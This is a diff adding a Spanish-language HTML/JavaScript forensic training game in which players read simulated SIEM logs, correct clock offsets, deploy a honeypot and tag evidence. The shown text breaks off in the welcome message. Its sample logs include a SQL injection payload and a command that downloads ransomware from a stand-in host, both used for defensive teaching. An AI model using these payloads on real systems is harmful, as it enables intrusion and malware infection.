@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Digital Detective - Forensic Proactivity</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            /* Paleta Cyberpunk / Terminal */
+            --bg-dark: #0a0a0a;
+            --panel-bg: #111111;
+            --text-main: #e0e0e0;
+            --text-muted: #888;
+            --accent: #00ff41; /* Verde Terminal clásico */
+            --accent-dim: rgba(0, 255, 65, 0.1);
+            
+            /* Colores específicos para fuentes de log */
+            --src-fw: #00ff41; 
+            --src-srv: #d33682; 
+            
+            --border: #333;
+            
+            --log-crit: #ff3333;
+            --log-warn: #ffcc00;
+            --log-info: #00ccff;
+            
+            /* Estados de Caso */
+            --status-pending: #ffe0b2; /* Ambar Pastel */
+            --status-solved: #00ff41;  /* Verde Vibrante */
+            
+            --font-ui: 'Segoe UI', Roboto, sans-serif;
+            --font-mono: 'Consolas', 'Monaco', monospace;
+        }
+
+        [data-theme="solarized"] {
+            --bg-dark: #fdf6e3;
+            --panel-bg: #eee8d5;
+            --text-main: #073642;
+            --text-muted: #586e75;
+            --accent: #268bd2; 
+            --accent-dim: rgba(38, 139, 210, 0.1);
+            --src-fw: #859900;
+            --src-srv: #d33682;
+            --border: #93a1a1;
+            --log-crit: #dc322f;
+            --log-warn: #b58900;
+            --log-info: #268bd2;
+            --status-pending: #cb4b16;
+            --status-solved: #859900;
+        }
+
+        * { box-sizing: border-box; }
+        body { margin: 0; background-color: var(--bg-dark); color: var(--text-main); font-family: var(--font-ui); height: 100vh; display: flex; flex-direction: column; overflow: hidden; transition: background 0.3s, color 0.3s; }
+
+        /* LAYOUT */
+        .dashboard-container {
+            display: grid;
+            grid-template-columns: 340px 1fr 380px;
+            grid-template-rows: 60px 1fr 250px;
+            height: 100%;
+            gap: 1px;
+            background-color: var(--border);
+        }
+
+        .panel { background-color: var(--panel-bg); padding: 15px; overflow: hidden; position: relative; display: flex; flex-direction: column; }
+
+        /* HEADER */
+        .header-panel {
+            grid-column: 1 / -1;
+            flex-direction: row; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid var(--accent);
+            box-shadow: 0 0 10px var(--accent-dim);
+            z-index: 10;
+        }
+
+        .brand { 
+            font-family: var(--font-mono); font-size: 1.2rem; font-weight: bold; color: var(--accent); 
+            display: flex; align-items: center; gap: 10px; text-transform: uppercase; letter-spacing: 2px;
+            cursor: pointer;
+        }
+        .brand i { text-shadow: 0 0 5px var(--accent); }
+
+        .header-actions { display: flex; gap: 10px; }
+
+        /* LEFT: CASE FILES */
+        .cases-panel {
+            grid-row: 2 / 4;
+            border-right: 1px solid var(--border);
+        }
+        .case-list { flex: 1; overflow-y: auto; margin-top: 10px; padding-right: 5px; }
+        .case-item {
+            padding: 15px; border-bottom: 1px solid var(--border); cursor: pointer; transition: all 0.2s;
+            font-family: var(--font-mono); font-size: 0.85rem; border-left: 4px solid transparent;
+            margin-bottom: 4px; background: rgba(255,255,255,0.02);
+        }
+        .case-item:hover { background: var(--accent-dim); }
+        .case-item.active { border-left-color: var(--accent); background: rgba(255,255,255,0.05); }
+        
+        .case-title { display: block; font-weight: bold; margin-bottom: 5px; color: var(--text-main); }
+        .case-meta { display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; text-transform: uppercase; }
+        
+        .status-badge { padding: 2px 6px; border-radius: 3px; font-weight: bold; letter-spacing: 0.5px; }
+        .status-pending { color: var(--status-pending); border: 1px solid var(--status-pending); }
+        .status-solved { color: #000; background: var(--status-solved); border: 1px solid var(--status-solved); box-shadow: 0 0 5px var(--status-solved); }
+
+        /* CENTER: SIEM CONSOLE */
+        .siem-panel {
+            grid-row: 2 / 3;
+            background-color: #000; 
+            color: #ccc;
+            font-family: var(--font-mono);
+            padding: 0; 
+            position: relative;
+        }
+        [data-theme="solarized"] .siem-panel { background-color: #fdf6e3; color: #657b83; }
+
+        .siem-toolbar {
+            padding: 10px; background: var(--panel-bg); border-bottom: 1px solid var(--border);
+            display: flex; gap: 10px; align-items: center; font-size: 0.8rem;
+        }
+        .log-window {
+            flex: 1; overflow-y: auto; padding: 15px; font-size: 0.9rem; line-height: 1.5;
+        }
+        .log-line {
+            display: flex; gap: 15px; padding: 4px 5px; border-radius: 2px; cursor: pointer;
+            transition: background 0.1s; border: 1px solid transparent;
+        }
+        .log-line:hover { background: rgba(255,255,255,0.1); border-color: #555; }
+        .log-line.tagged { background: rgba(0, 255, 65, 0.05); border-left: 3px solid var(--accent); }
+        
+        /* NTP Visual Feedback Classes */
+        .log-line.shifting-fw .ts { color: var(--src-fw); font-weight: bold; }
+        .log-line.shifting-auth .ts { color: var(--src-srv); font-weight: bold; }
+
+        .ts { color: var(--text-muted); width: 140px; flex-shrink: 0; transition: color 0.2s; }
+        .src { color: var(--log-info); width: 110px; flex-shrink: 0; font-weight: bold; }
+        .evt { flex: 1; word-break: break-all; }
+        
+        .log-crit .evt { color: var(--log-crit); }
+        .log-warn .evt { color: var(--log-warn); }
+
+        /* RIGHT: TOOLS & EVIDENCE */
+        .tools-panel {
+            grid-row: 2 / 4;
+            border-left: 1px solid var(--border);
+            gap: 20px;
+        }
+
+        .tool-card {
+            background: rgba(255,255,255,0.03); border: 1px solid var(--border);
+            padding: 15px; border-radius: 4px;
+        }
+        .tool-card h4 { margin: 0 0 10px 0; color: var(--accent); font-size: 0.9rem; text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 5px; }
+
+        .evidence-list {
+            flex: 1; overflow-y: auto; background: rgba(0,0,0,0.2); 
+            border: 1px solid var(--border); padding: 10px; font-family: var(--font-mono); font-size: 0.8rem;
+        }
+        .evidence-item { margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px dashed var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .evidence-tag { color: var(--accent); font-weight: bold; font-size: 0.7rem; border: 1px solid var(--accent); padding: 2px 6px; border-radius: 3px; }
+
+        /* BOTTOM: TIMELINE / NTP */
+        .timeline-panel {
+            grid-column: 2 / 3;
+            grid-row: 3 / 4;
+            border-top: 1px solid var(--border);
+            display: flex; flex-direction: column;
+            padding: 0;
+        }
+        .ntp-info { padding: 10px 15px; background: rgba(59,130,246,0.05); font-size: 0.85rem; border-bottom: 1px solid var(--border); color: var(--text-muted); display: flex; align-items: center; gap: 10px;}
+        .ntp-controls {
+            padding: 15px 25px; display: flex; flex-direction: column; gap: 15px; flex: 1; justify-content: center;
+            background: var(--panel-bg);
+        }
+        .slider-group { display: flex; flex-direction: column; gap: 5px; width: 100%; }
+        .slider-header { display: flex; justify-content: space-between; font-family: var(--font-mono); font-size: 0.85rem; margin-bottom: 2px; }
+        .slider-val { font-weight: bold; background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 4px;}
+        input[type=range] { width: 100%; cursor: pointer; accent-color: var(--accent); height: 5px; }
+
+        /* BUTTONS */
+        .btn {
+            background: transparent; border: 1px solid var(--accent); color: var(--accent);
+            padding: 8px 12px; cursor: pointer; font-family: var(--font-mono); text-transform: uppercase;
+            transition: all 0.2s; font-size: 0.8rem; display: inline-flex; align-items: center; gap: 8px;
+            border-radius: 2px;
+        }
+        .btn:hover { background: var(--accent); color: #000; box-shadow: 0 0 15px var(--accent); }
+        .btn:disabled { border-color: var(--text-muted); color: var(--text-muted); cursor: not-allowed; box-shadow: none; background: transparent; opacity: 0.5; }
+        
+        .btn-honey { border-color: var(--log-warn); color: var(--log-warn); }
+        .btn-honey:hover { background: var(--log-warn); color: #000; box-shadow: 0 0 15px var(--log-warn); }
+        
+        .btn-big { width: 100%; padding: 15px; font-weight: bold; font-size: 1rem; margin-top: auto; justify-content: center; letter-spacing: 1px;}
+
+        /* GLOSSARY LINKS */
+        .def-link {
+            border-bottom: 1px dotted var(--accent); cursor: help; color: var(--text-main); text-decoration: none;
+        }
+        .def-link:hover { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
+
+        /* MODAL */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 100; display: none;
+            justify-content: center; align-items: center; backdrop-filter: blur(5px);
+        }
+        .modal {
+            background: var(--panel-bg); border: 1px solid var(--accent);
+            width: 750px; max-width: 95%; max-height: 90vh;
+            display: flex; flex-direction: column;
+            box-shadow: 0 0 50px var(--accent-dim);
+            animation: scanline 0.1s linear;
+        }
+        .modal-header { padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.05); }
+        .modal-header h2 { margin: 0; font-family: var(--font-mono); color: var(--accent); font-size: 1.3rem; letter-spacing: 1px; }
+        .modal-body { padding: 25px; overflow-y: auto; font-family: var(--font-ui); line-height: 1.6; font-size: 1rem; }
+        .modal-footer { padding: 20px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 15px; }
+
+        /* ANALYSIS BOXES */
+        .analysis-box { margin-bottom: 20px; padding: 15px; border-left: 4px solid var(--text-muted); background: rgba(255,255,255,0.03); }
+        .analysis-title { font-weight: bold; text-transform: uppercase; font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .analysis-content { font-size: 0.95rem; color: var(--text-main); }
+        
+        .analysis-tech { border-left-color: var(--log-info); }
+        .analysis-tech .analysis-title { color: var(--log-info); }
+        
+        .analysis-layman { border-left-color: var(--accent); }
+        .analysis-layman .analysis-title { color: var(--accent); }
+        
+        .analysis-hint { border-left-color: var(--log-warn); background: rgba(255, 204, 0, 0.05); font-style: italic; }
+        .analysis-hint .analysis-title { color: var(--log-warn); }
+
+        @keyframes scanline {
+            0% { transform: scaleY(0); } 100% { transform: scaleY(1); }
+        }
+
+        @media (max-width: 1000px) {
+            .dashboard-container {
+                grid-template-columns: 1fr; grid-template-rows: auto; display: flex; flex-direction: column; overflow-y: auto;
+            }
+            .siem-panel { height: 400px; }
+            .ntp-controls { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="dashboard-container">
+    
+    <!-- HEADER -->
+    <div class="panel header-panel">
+        <div class="brand" onclick="location.reload()">
+            <i class="fa-solid fa-user-secret fa-xl"></i>
+            <div>
+                <div style="font-size:0.7em; color:var(--text-muted); line-height:1;">SIMULADOR FORENSE</div>
+                <span>EL DETECTIVE DIGITAL</span>
+            </div>
+        </div>
+        <div style="font-family:var(--font-mono); font-size:0.9rem; text-align:right;">
+            <div>CASO ACTIVO: <span id="case-id" style="color:var(--accent); font-weight:bold;">--</span></div>
+            <div style="font-size:0.75rem; color:var(--text-muted);">EVIDENCIAS: <span id="evidence-count">0</span> / REQUERIDAS: <span id="evidence-req">0</span></div>
+        </div>
+        <div class="header-actions">
+            <button class="btn" onclick="toggleTheme()"><i class="fa-solid fa-adjust"></i> TEMA</button>
+            <button class="btn" onclick="showGlossary()"><i class="fa-solid fa-book-open"></i> GLOSARIO</button>
+        </div>
+    </div>
+
+    <!-- LEFT: CASE FILES -->
+    <div class="panel cases-panel">
+        <div style="padding-bottom:15px; border-bottom:1px solid var(--border); margin-bottom:5px;">
+            <h4 style="margin:0; color:var(--accent); display:flex; justify-content:space-between; align-items:center;">
+                <span><i class="fa-solid fa-folder-open"></i> EXPEDIENTES</span>
+                <span style="font-size:0.8rem; background:var(--accent); color:#000; padding:2px 6px; border-radius:4px;">20</span>
+            </h4>
+            <p style="margin:5px 0 0 0; font-size:0.75rem; color:var(--text-muted);">Selecciona un caso para investigar.</p>
+        </div>
+        <div class="case-list" id="case-list">
+            <!-- Generated by JS -->
+        </div>
+    </div>
+
+    <!-- CENTER: SIEM -->
+    <div class="panel siem-panel">
+        <div class="siem-toolbar">
+            <span style="color:var(--accent); font-weight:bold;"><i class="fa-solid fa-terminal"></i> SIEM CONSOLE V.4</span>
+            <div style="flex:1"></div>
+            <input type="text" id="log-filter" placeholder="> Filtrar logs (RegEx)..." style="background:#222; border:1px solid #444; color:white; padding:4px 8px; font-family:var(--font-mono); width: 200px;">
+            <button class="btn" style="font-size:0.7rem; padding:4px 8px;" onclick="clearFilter()">CLR</button>
+        </div>
+        
+        <!-- Hint Banner -->
+        <div style="background:rgba(255,255,255,0.05); padding:8px; font-size:0.8rem; text-align:center; color:var(--text-muted); border-bottom:1px solid var(--border);">
+            <i class="fa-solid fa-computer-mouse"></i> Haz clic en cualquier línea de log para abrir la <strong>LUPA FORENSE</strong> y analizarla.
+        </div>
+
+        <div class="log-window" id="log-window">
+            <!-- Logs go here -->
+            <div style="text-align:center; padding-top:50px; color:#444;">
+                <i class="fa-solid fa-folder-closed fa-3x"></i><br><br>
+                SELECCIONA UN CASO PARA CARGAR LOS REGISTROS
+            </div>
+        </div>
+    </div>
+
+    <!-- RIGHT: TOOLS -->
+    <div class="panel tools-panel">
+        <!-- Deception Tool -->
+        <div class="tool-card">
+            <h4><i class="fa-solid fa-spider"></i> Operación: Decepción</h4>
+            <p style="font-size:0.85rem; color:var(--text-main); margin-bottom:10px;">
+                ¿Tráfico sospechoso pero inconcluso? <br>
+                Despliega un <strong><span class="def-link" onclick="showDef('Honey Pot')">Honey Pot</span></strong> para atraer al atacante y capturar su IP real o herramientas.
+            </p>
+            <button class="btn btn-honey" style="width:100%" id="btn-honeypot" onclick="deployHoneyPot()">
+                <i class="fa-solid fa-network-wired"></i> DESPLEGAR SEÑUELO
+            </button>
+        </div>
+
+        <!-- Evidence Bag -->
+        <div class="tool-card" style="flex:1; display:flex; flex-direction:column;">
+            <h4><i class="fa-solid fa-scale-balanced"></i> Cadena de Custodia</h4>
+            <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:10px;">
+                Las evidencias etiquetadas se guardan aquí para el juicio.
+            </p>
+            <div class="evidence-list" id="evidence-list">
+                <div style="text-align:center; color:#444; padding-top:20px;">Bolsa de evidencia vacía</div>
+            </div>
+        </div>
+
+        <!-- Submit -->
+        <button class="btn btn-big" onclick="submitToCourt()">
+            <i class="fa-solid fa-gavel"></i> PRESENTAR CASO
+        </button>
+    </div>
+
+    <!-- BOTTOM: NTP -->
+    <div class="panel timeline-panel">
+        <div class="ntp-info">
+            <i class="fa-solid fa-clock-rotate-left" style="color:var(--accent)"></i>
+            <strong>PUZZLE NTP (Sincronización de Tiempo):</strong>
+            <span style="color:var(--text-muted)">Mueve los deslizadores para corregir los relojes desfasados. Busca eventos coincidentes (ej. una conexión) y alinea sus horas.</span>
+        </div>
+        <div class="ntp-controls">
+            <div class="slider-group">
+                <div class="slider-header">
+                    <span style="color:var(--src-fw)"><i class="fa-solid fa-shield-halved"></i> FIREWALL / ROUTER Offset</span>
+                    <span class="slider-val" id="offset-fw-val" style="color:var(--src-fw)">0s</span>
+                </div>
+                <input type="range" min="-300" max="300" value="0" id="offset-fw" oninput="updateLogs()">
+            </div>
+            <div class="slider-group">
+                <div class="slider-header">
+                    <span style="color:var(--src-srv)"><i class="fa-solid fa-server"></i> SERVIDOR / AUTH Offset</span>
+                    <span class="slider-val" id="offset-auth-val" style="color:var(--src-srv)">0s</span>
+                </div>
+                <input type="range" min="-300" max="300" value="0" id="offset-auth" oninput="updateLogs()">
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal-overlay">
+    <div class="modal">
+        <div class="modal-header">
+            <h2 id="modal-title">TITULO</h2>
+            <button class="btn" style="border:none;" onclick="closeModal()"><i class="fa-solid fa-xmark fa-lg"></i></button>
+        </div>
+        <div class="modal-body" id="modal-body">
+            Contenido...
+        </div>
+        <div class="modal-footer" id="modal-footer">
+            <!-- Buttons injected here -->
+        </div>
+    </div>
+</div>
+
+<script>
+(function() {
+
+    /* --- GLOSSARY DATABASE --- */
+    const GLOSSARY = {
+        "CISO": "Chief Information Security Officer. El jefe máximo de seguridad. En este juego, eres tú.",
+        "NTP": "Network Time Protocol. Es como poner todos los relojes de la empresa en hora exacta. Sin NTP, un log de las 10:00 en el firewall y uno de las 10:05 en el servidor podrían ser el mismo evento, pero un juez los rechazaría por incoherentes.",
+        "Honey Pot": "Un 'Tarro de Miel'. Es un servidor falso, lleno de vulnerabilidades aparentes, puesto ahí a propósito para que los hackers lo ataquen. Como ningún usuario real debería entrar ahí, CUALQUIER tráfico que veas en un Honey Pot es, por definición, malicioso y una prueba irrefutable.",
+        "Decepción": "El arte de engañar al atacante. En lugar de bloquearlo (lo que le avisa que lo has visto), le dejas entrar a un entorno falso (Honey Pot) para estudiar sus herramientas y descubrir quién es.",
+        "Bombero": "Estrategia antigua y reactiva. Ves un fuego (ataque) y lo apagas (bloqueas IP). El problema es que el pirómano sigue libre y volverá mañana. NO queremos ser bomberos.",
+        "Detective": "Estrategia proactiva. Ves un fuego, dejas que arda un poco en un entorno controlado, recoges huellas, y arrestas al pirómano. ESTO es lo que buscamos.",
+        "Cadena de Custodia": "Proceso legal. Significa garantizar que la prueba que recogiste es la misma que presentas al juez, sin alteraciones. Por eso 'etiquetamos' logs, nunca los editamos.",
+        "SIEM": "El 'Cerebro' de seguridad. Una consola que junta los logs de todos los aparatos (Firewalls, Routers, Servidores) en una sola pantalla para poder correlacionarlos.",
+        "DDoS": "Ataque de Denegación de Servicio. Imagina que 10.000 personas intentan entrar por una puerta a la vez. La puerta se bloquea y nadie legítimo puede pasar.",
+        "SQLi": "Inyección SQL. Es como si en un formulario web, en lugar de poner tu nombre, pones una orden para que la base de datos te dé todas las contraseñas. Si la base de datos responde con un error de sintaxis, es que es vulnerable.",
+        "Ransomware": "El secuestro digital. Un virus cifra tus archivos y te pide dinero (bitcoin) para darte la clave. La mejor defensa son los backups offline.",
+        "Movimiento Lateral": "Cuando un atacante entra en un ordenador poco importante (ej. recepción) y desde ahí salta a servidores críticos. Es como entrar por la ventana del baño para llegar a la caja fuerte."
+    };
+
+    /* --- REALISTIC CASE SCENARIOS --- */
+    const CASES = [
+        {
+            id: 1,
+            title: "Caso: El Reloj Roto",
+            type: "Desincronización",
+            solved: false,
+            brief: "<p><strong>SITUACIÓN:</strong> El Director Financiero reporta que accedieron a sus archivos a las 10:00:00 AM. Sin embargo, el Firewall perimetral dice que no entró nadie a esa hora, su último registro es de las 09:59:00.</p><p><strong>HIPÓTESIS:</strong> Los relojes están desfasados por 60 segundos exactos.</p><p><strong>MISIÓN:</strong> Usa los deslizadores de tiempo para sumar 60 segundos al Firewall y ver si la conexión externa coincide con el acceso interno.</p>",
+            logs: [
+                { src: "FW-PERIMETRO", time: "09:59:00", msg: "Traffic allowed from 192.168.1.50 to FILE-SRV port 443", type: "info", offset: -60 }, // Retrasado 60s
+                { src: "FW-PERIMETRO", time: "09:59:05", msg: "Traffic allowed from 192.168.1.50 to FILE-SRV port 443", type: "info", offset: -60 },
+                { src: "FILE-SRV", time: "10:00:02", msg: "User 'CFO' accessed confidential_budget.xlsx", type: "warn", offset: 0 },
+                { src: "FILE-SRV", time: "10:00:05", msg: "File download completed (Size: 50MB)", type: "crit", offset: 0 },
+                { src: "FW-PERIMETRO", time: "09:59:10", msg: "Traffic allowed from 192.168.1.50 to FILE-SRV port 443", type: "info", offset: -60 }
+            ],
+            solution: { tagCount: 2, needsNTP: true, fwOffset: 60, authOffset: 0 }
+        },
+        {
+            id: 2,
+            title: "Caso: El Eco de la Base de Datos",
+            type: "SQL Injection",
+            solved: false,
+            brief: "<p><strong>SITUACIÓN:</strong> El servidor web está lanzando errores extraños. Parece que alguien está 'hablando' directamente con la base de datos a través del formulario de búsqueda.</p><p><strong>MISIÓN:</strong> Detecta el patrón de ataque SQL Injection. No necesitamos NTP aquí, los tiempos coinciden. Busca errores de sintaxis.</p>",
+            logs: [
+                { src: "WAF", time: "14:30:10", msg: "Incoming Request from 45.33.22.11: GET /search?q=iphone", type: "info", offset: 0 },
+                { src: "DB-CLUSTER", time: "14:30:11", msg: "Query executed: SELECT * FROM products WHERE name LIKE '%iphone%'", type: "info", offset: 0 },
+                { src: "WAF", time: "14:30:15", msg: "Incoming Request from 45.33.22.11: GET /search?q=iphone' UNION SELECT user,pass FROM users--", type: "warn", offset: 0 },
+                { src: "DB-CLUSTER", time: "14:30:16", msg: "SQL Syntax Error: ORA-01790: expression must have same datatype", type: "crit", offset: 0 },
+                { src: "WAF", time: "14:31:00", msg: "Incoming Request from 200.1.1.5: GET /home", type: "info", offset: 0 }
+            ],
+            solution: { tagCount: 2, needsNTP: false, fwOffset: 0, authOffset: 0 }
+        },
+        {
+            id: 3,
+            title: "Caso: El Intruso Invisible",
+            type: "Movimiento Lateral",
+            solved: false,
+            brief: "<p><strong>SITUACIÓN:</strong> Tenemos alertas de intentos de login fallidos en varios servidores internos. El atacante ya está dentro de la red, pero no sabemos desde qué IP real está operando ni qué herramientas usa.</p><p><strong>MISIÓN:</strong> Los logs actuales son insuficientes. <strong>Debes desplegar el HONEY POT</strong> (Señuelo) para atraerlo. Cuando ataque el sistema falso, revelará su verdadera naturaleza.</p>",
+            logs: [
+                { src: "FW-INT", time: "03:00:00", msg: "Internal Scan detected on segment 10.0.5.x", type: "warn", offset: 0 },
+                { src: "AUTH-SRV", time: "03:00:05", msg: "Failed login root@10.0.5.20", type: "info", offset: 0 },
+                { src: "AUTH-SRV", time: "03:00:06", msg: "Failed login admin@10.0.5.20", type: "info", offset: 0 },
+                { src: "AUTH-SRV", time: "03:00:07", msg: "Failed login user@10.0.5.20", type: "info", offset: 0 }
+            ],
+            extraLogs: [
+                { src: "HONEYPOT", time: "03:01:10", msg: "** TRAP TRIGGERED ** Connection accepted from 10.0.5.99 (Attacker IP)", type: "crit", offset: 0 },
+                { src: "HONEYPOT", time: "03:01:12", msg: "Command received: wget http://evil-c2.com/ransomware.exe", type: "crit", offset: 0 },
+                { src: "HONEYPOT", time: "03:01:15", msg: "Malware Hash Captured: a1b2c3d4e5... (Evidence Secured)", type: "info", offset: 0 }
+            ],
+            solution: { tagCount: 1, needsHoney: true, needsNTP: false, fwOffset: 0, authOffset: 0 }
+        }
+    ];
+
+    // Procedural generation for cases 4-20 with realistic names
+    const CASE_TEMPLATES = [
+        { title: "Amanecer Rojo", type: "Exfiltración", brief: "Tráfico saliente masivo detectado a horas inusuales (3 AM). Posible robo de propiedad intelectual." },
+        { title: "Fuerza Bruta", type: "Auth Attack", brief: "Miles de intentos de acceso en el servidor de correo en menos de un minuto." },
+        { title: "Phishing Ejecutivo", type: "Ingeniería Social", brief: "El CEO reporta correos extraños. Logs de correo muestran adjuntos sospechosos." },
+        { title: "Botnet Dormida", type: "Malware", brief: "Varios equipos de oficina están contactando con IPs conocidas de C2 (Comando y Control)." },
+        { title: "Inyección XSS", type: "Web Attack", brief: "Scripts maliciosos detectados en los comentarios del blog corporativo." },
+        { title: "DDoS en Progreso", type: "Traffic", brief: "El ancho de banda está saturado. Logs del router muestran millones de paquetes SYN." }
+    ];
+
+    for(let i=4; i<=20; i++) {
+        const template = CASE_TEMPLATES[(i-4) % CASE_TEMPLATES.length];
+        // Random offsets for NTP puzzles
+        const routerOffset = (i % 3 === 0) ? -120 : (i % 4 === 0) ? 60 : 0;
+        const targetOffset = routerOffset * -1; // User needs to apply inverse to fix
+
+        CASES.push({
+            id: i,
+            title: `Caso: ${template.title} #${i}`,
+            type: template.type,
+            solved: false,
+            brief: `<p><strong>SITUACIÓN:</strong> ${template.brief}</p><p><strong>MISIÓN:</strong> Correlaciona los eventos. Si hay discrepancia temporal, usa NTP. Si faltan pruebas, usa el Honey Pot.</p>`,
+            logs: [
+                { src: "ROUTER", time: `12:${i}:00`, msg: `Packet flow start IP 192.168.0.${i}`, type: "info", offset: routerOffset },
+                { src: "SERVER", time: `12:${i}:02`, msg: "Unauthorized access attempt detected", type: "crit", offset: 0 },
+                { src: "ROUTER", time: `12:${i}:05`, msg: `Packet flow end`, type: "info", offset: routerOffset }
+            ],
+            extraLogs: [
+                { src: "HONEYPOT", time: `12:${i+1}:00`, msg: "Attacker tool signature detected: 'Hydra v8.1'", type: "crit", offset: 0 }
+            ],
+            solution: { 
+                tagCount: 1, 
+                needsNTP: (routerOffset !== 0), 
+                fwOffset: targetOffset, 
+                authOffset: 0,
+                needsHoney: (i % 2 === 0) 
+            }
+        });
+    }
+
+    /* --- STATE --- */
+    let currentCase = null;
+    let evidence = [];
+    let activeLogs = [];
+    let honeyPotDeployed = false;
+    let clickedLogData = null;
+
+    /* --- ANALYSIS ENGINE --- */
+    function analyzeLog(log) {
+        const msg = log.msg.toLowerCase();
+        let analysis = { tech: "", simple: "", hint: "" };
+
+        if (msg.includes("traffic allowed") || msg.includes("packet flow")) {
+            analysis.tech = "Registro de flujo de red (NetFlow) a nivel de Firewall/Router. Indica que un paquete TCP/IP ha sido evaluado contra una ACL (Lista de Control de Acceso) y se le ha permitido pasar (acción: PERMIT). Este log contiene metadatos (IP origen, destino, puerto) pero no el contenido del paquete.";
+            analysis.simple = "Imagina un portero en un edificio de alta seguridad. Este registro es como la hoja de firmas de la entrada: dice quién entró y a qué hora, pero no dice qué lleva en la mochila ni qué hizo una vez dentro.";
+            analysis.hint = "En el análisis forense, este log es tu 'ancla' de tiempo. Si el firewall dice que una conexión ocurrió a las 10:00, y el servidor atacado dice que fue a las 10:05, tienes un problema de sincronización (NTP). Usa este log para alinear los relojes.";
+        }
+        else if (msg.includes("get /") || msg.includes("post /")) {
+            analysis.tech = "Petición HTTP estándar capturada por el servidor web o WAF. 'GET' indica solicitud de datos, 'POST' envío de datos (formulario). El código '200 OK' significa que el servidor procesó la petición correctamente.";
+            analysis.simple = "Es como si alguien entrara a una biblioteca y le pidiera al bibliotecario un libro específico (GET) o le entregara un formulario relleno (POST).";
+            analysis.hint = "Analiza la URL solicitada. ¿Es una página normal como '/index.html' o contiene caracteres extraños como comillas o guiones? Si ves patrones raros, podría ser un intento de ataque web.";
+        }
+        else if (msg.includes("sql syntax") || msg.includes("ora-") || msg.includes("union select")) {
+            analysis.tech = "Excepción crítica de base de datos. La consulta SQL generada por la aplicación falló debido a sintaxis inválida. Esto ocurre típicamente cuando un usuario inyecta caracteres de control (como comillas simples) en un campo de entrada, rompiendo la lógica de la consulta original.";
+            analysis.simple = "Alguien intentó hablar con el archivo en un idioma confuso para engañarlo y que entregara expedientes secretos. El archivo se confundió y gritó '¡No entiendo!', revelando que es vulnerable a ser manipulado.";
+            analysis.hint = "¡EVIDENCIA CRÍTICA! Un usuario legítimo nunca causaría un error de sintaxis SQL navegando normalmente. Esto confirma un intento activo de Inyección SQL. Etiquétalo inmediatamente.";
+        }
+        else if (msg.includes("failed login") || msg.includes("unauthorized")) {
+            analysis.tech = "Evento de autenticación fallida. El servicio de directorio (LDAP/AD) rechazó las credenciales proporcionadas.";
+            analysis.simple = "Alguien intentó abrir una puerta con la llave equivocada.";
+            analysis.hint = "Contexto es clave: ¿Es un solo fallo? Probablemente un usuario se olvidó su clave. ¿Son 500 fallos en un segundo? Es un ataque de fuerza bruta automatizado. Si es esto último, es evidencia.";
+        }
+        else if (log.src === "HONEYPOT" || msg.includes("trap triggered")) {
+            analysis.tech = "Alerta de alta fidelidad proveniente de un sistema de decepción. Un Honey Pot no tiene usuarios legítimos, por lo que cualquier interacción con él es, por definición, no autorizada y maliciosa. Se han capturado TTPs (Tácticas, Técnicas y Procedimientos).";
+            analysis.simple = "El ladrón ha entrado en la 'habitación trampa' que preparamos. Creía que estaba robando datos reales, pero en realidad estaba siendo grabado por cámaras ocultas desde todos los ángulos.";
+            analysis.hint = "Esta es la prueba definitiva. A diferencia de los logs defensivos que solo dicen 'alguien golpeó la puerta', este log te dice 'esta es la cara del ladrón y esta es la herramienta que usó'. Etiquétalo sin dudar.";
+        }
+        else {
+            analysis.tech = "Log genérico del sistema operativo o aplicación.";
+            analysis.simple = "El sistema ha tomado nota de una operación rutinaria.";
+            analysis.hint = "Por sí solo puede no decir mucho, pero es vital para establecer la 'línea base' de normalidad. ¿Ocurrió esto antes o después del ataque?";
+        }
+
+        return analysis;
+    }
+
+    /* --- HELPER: FORMAT TEXT LINKS --- */
+    function formatText(text) {
+        const keys = Object.keys(GLOSSARY).sort((a,b) => b.length - a.length);
+        let formatted = text;
+        keys.forEach(key => {
+            const regex = new RegExp(`\\b(${key})\\b`, 'gi');
+            formatted = formatted.replace(regex, `<a href="#" class="def-link" onclick="showDef('${key}'); return false;">$1</a>`);
+        });
+        return formatted;
+    }
+
+    window.showDef = function(key) {
+        const def = GLOSSARY[Object.keys(GLOSSARY).find(k => k.toUpperCase() === key.toUpperCase())];
+        if(def) {
+            const html = `
+                <div style="text-align:center; margin-bottom:20px;">
+                    <i class="fa-solid fa-book-open fa-3x" style="color:var(--accent)"></i>
+                </div>
+                <p style="font-size:1.1rem; line-height:1.6;">${def}</p>
+            `;
+            showModal(key.toUpperCase(), html, "ENTENDIDO");
+        }
+    };
+
+    /* --- INIT --- */
+    function init() {
+        renderCaseList();
+        showWelcome();
+    }
+
+    function showWelcome() {
+        const html = formatText(`
+            <div style="background:rgba(0, 255, 65, 0.05); border-left:4px solid var(--accent); padding:15px; margin-bottom:20px;">
+                <h3 style="margin-top:0; color:var(--accent)">MANIFIESTO DEL DETECTIVE DIGITAL</h3>
+                <p>Bienvenido al <strong>CISO Command Center</strong>. Olvida lo que sabes. Aquí no somos "Bomberos" que apagan servidores ante el pánico. Aquí somos <strong>Detectives</strong>.</p>
+            </div>
+            
+            <p>Tu misión es aplicar la doctrina de <strong>"Seguir y Perseguir"</strong>:</p>
+            
